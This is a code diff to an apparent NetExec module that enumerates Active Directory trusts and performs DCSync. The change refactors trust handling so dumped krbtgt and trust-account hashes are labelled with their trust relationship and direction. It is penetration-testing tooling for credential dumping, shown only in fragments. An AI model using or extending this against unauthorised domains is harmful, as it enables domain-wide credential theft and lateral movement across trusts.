@@ -52,11 +52,11 @@ class NXCModule:
             if is_domain_admin:
                 context.log.success(f"User {connection.username} is a Domain Administrator!")
                 
-                # First enumerate domain trusts to get trust names
-                trust_names = self.enumerate_trusts(context, connection)
+                # First enumerate domain trusts to get trust names and info
+                trust_info_list = self.enumerate_trusts(context, connection)
                 
-                # Perform DCSync and extract hashes (will filter based on trust_names)
-                self.perform_dcsync(context, connection, trust_names)
+                # Perform DCSync and extract hashes (will filter based on trust_info_list)
+                self.perform_dcsync(context, connection, trust_info_list)
             else:
                 context.log.fail(f"User {connection.username} is NOT a Domain Administrator")
                 context.log.fail("Domain Admin privileges required for DCSync operations")
@@ -142,7 +142,7 @@ class NXCModule:
             context.log.debug(traceback.format_exc())
             return False
 
-    def perform_dcsync(self, context, connection, trust_names=None):
+    def perform_dcsync(self, context, connection, trust_info_list=None):
         """Perform DCSync and extract all hashes, highlight krbtgt and trust accounts"""
         try:
             context.log.info("Starting DCSync operation...")
@@ -162,14 +162,21 @@ class NXCModule:
             self.krbtgt_hash = None
             self.trust_hashes = []
             self.all_hashes = []
+            self.trust_info_list = trust_info_list or []
             
             # Prepare trust account names to match (convert trust names to account format)
             trust_account_names = set()
-            if trust_names:
-                for trust_name in trust_names:
-                    # Trust accounts are typically stored as TRUSTNAME$ or trust_name$
-                    trust_account_names.add(f"{trust_name.upper()}$")
-                    trust_account_names.add(f"{trust_name.lower()}$")
+            if trust_info_list:
+                for trust_info in trust_info_list:
+                    flat_name = trust_info.get("flat_name", "")
+                    if flat_name:
+                        # Trust accounts are typically stored as TRUSTNAME$ or trust_name$
+                        trust_account_names.add(f"{flat_name.upper()}$")
+                        trust_account_names.add(f"{flat_name.lower()}$")
+                        # Also try without domain suffix in case it's stored differently
+                        base_name = flat_name.split('.')[0]
+                        trust_account_names.add(f"{base_name.upper()}$")
+                        trust_account_names.add(f"{base_name.lower()}$")
             
             def hash_callback(secret_type, secret):
                 """Callback to capture all hashes and identify special ones"""
@@ -232,11 +239,31 @@ class NXCModule:
             else:
                 context.log.fail("krbtgt hash not found")
             
-            # Display trust account hashes
+            # Display trust account hashes with trust information
             if self.trust_hashes:
                 context.log.success(f"Found {len(self.trust_hashes)} trust account hash(es):")
                 for trust_hash in self.trust_hashes:
+                    # Extract account name from hash
+                    account_name = trust_hash.split(":")[0]
+                    # Find matching trust info
+                    matching_trust = None
+                    for trust_info in self.trust_info_list:
+                        flat_name = trust_info.get("flat_name", "")
+                        if flat_name and account_name.upper() == f"{flat_name.upper()}$":
+                            matching_trust = trust_info
+                            break
+                        # Also try base name
+                        base_name = flat_name.split('.')[0]
+                        if base_name and account_name.upper() == f"{base_name.upper()}$":
+                            matching_trust = trust_info
+                            break
+                    
+                    # Display hash with trust info
                     context.log.highlight(f"  {trust_hash}")
+                    if matching_trust:
+                        trust_name = matching_trust.get("name", "Unknown")
+                        direction = matching_trust.get("direction", "Unknown")
+                        context.log.highlight(f"    → Trust with: {trust_name} (Direction: {direction})")
             else:
                 context.log.info("No trust account hashes found")
                 
@@ -254,9 +281,12 @@ class NXCModule:
 
     def enumerate_trusts(self, context, connection):
         """Enumerate domain trust relationships using LSA RPC over SMB"""
-        trust_names = []
+        trust_info_list = []
         try:
             context.log.info("Enumerating domain trust relationships via LSA RPC...")
+            
+            # Get current domain name
+            current_domain = connection.domain
             
             # Create RPC connection to LSARPC
             try:
@@ -265,7 +295,7 @@ class NXCModule:
             except Exception as e:
                 context.log.fail(f"Failed to connect to LSARPC: {e}")
                 context.log.debug(traceback.format_exc())
-                return trust_names
+                return trust_info_list
             
             # Open LSA policy handle
             try:
@@ -274,7 +304,7 @@ class NXCModule:
             except Exception as e:
                 context.log.fail(f"Failed to open LSA policy: {e}")
                 context.log.debug(traceback.format_exc())
-                return trust_names
+                return trust_info_list
             
             # Enumerate trusted domains
             try:
@@ -288,7 +318,7 @@ class NXCModule:
                     lsad.hLsarClose(dce, policy_handle)
                 except Exception:
                     pass
-                return trust_names
+                return trust_info_list
             
             # Parse and display trusts
             trusts_found = 0
@@ -300,10 +330,6 @@ class NXCModule:
                     trust_direction = trust["TrustDirection"]
                     trust_type = trust["TrustType"]
                     trust_attributes = trust["TrustAttributes"]
-                    
-                    # Store trust flat name for hash correlation
-                    if trust_flat_name and trust_flat_name != "Unknown":
-                        trust_names.append(trust_flat_name)
                     
                     # Convert trust direction to text
                     direction_text = {
@@ -342,8 +368,20 @@ class NXCModule:
                     
                     trust_attr_text = ", ".join(trust_attr_flags) if trust_attr_flags else "None"
                     
-                    # Display trust information
-                    context.log.highlight(f"Trust: {trust_name}")
+                    # Store trust information for later use
+                    trust_info = {
+                        "name": trust_name,
+                        "flat_name": trust_flat_name,
+                        "direction": direction_text,
+                        "type": trust_type_text,
+                        "attributes": trust_attr_text
+                    }
+                    if trust_flat_name and trust_flat_name != "Unknown":
+                        trust_info_list.append(trust_info)
+                    
+                    # Display trust relationship clearly
+                    context.log.success(f"Trust relationship {trusts_found}:")
+                    context.log.highlight(f"  {current_domain} ←→ {trust_name}")
                     context.log.highlight(f"  Flat Name: {trust_flat_name}")
                     context.log.highlight(f"  Direction: {direction_text}")
                     context.log.highlight(f"  Type: {trust_type_text}")
@@ -362,13 +400,11 @@ class NXCModule:
             
             if trusts_found == 0:
                 context.log.info("No trust relationships found")
-            else:
-                context.log.success(f"Found {trusts_found} trust relationship(s)")
             
-            return trust_names
+            return trust_info_list
                 
         except Exception as e:
             context.log.fail(f"Error enumerating trusts: {e}")
             context.log.debug(traceback.format_exc())
-            return trust_names
+            return trust_info_list
             context.log.debug(traceback.format_exc())
